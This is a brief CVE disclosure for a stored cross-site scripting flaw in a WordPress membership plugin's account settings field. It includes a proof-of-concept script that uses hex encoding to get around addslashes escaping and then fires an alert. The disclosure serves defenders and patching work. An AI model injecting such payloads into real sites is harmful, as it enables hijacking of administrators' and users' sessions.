# CVE-2018-10234

[Suggested description]

    Authenticated Cross site Scripting exists in the User Profile & Membership plugin before 2.0.11 for WordPress via the
    "Account Deletion Custom Text"
    input field on the wp-admin/admin.php?page=um_options&section=account page.
 
 
 [Additional Information]
 
    In order to execute javascript payloads with strings you need to apply hex encoding because of addslashes like:
 
    <script>
        function hex2a(hexx) {
            var str = 0;
            for (index = 0, len = hexx.length; index < len; ++index) {
            var hex = hexx[index].toString(16);

            for (var i = 0; i < hex.length; i += 2)
                str += String.fromCharCode(parseInt(hex.substr(i, 2), 16));
            }
            return str.slice(1);
        }

        var decode = [0x68, 0x74, 0x74, 0x70, 0x3a, 0x2f, 0x2f]

        var string = hex2a(decode);
        alert(string);
    </script>
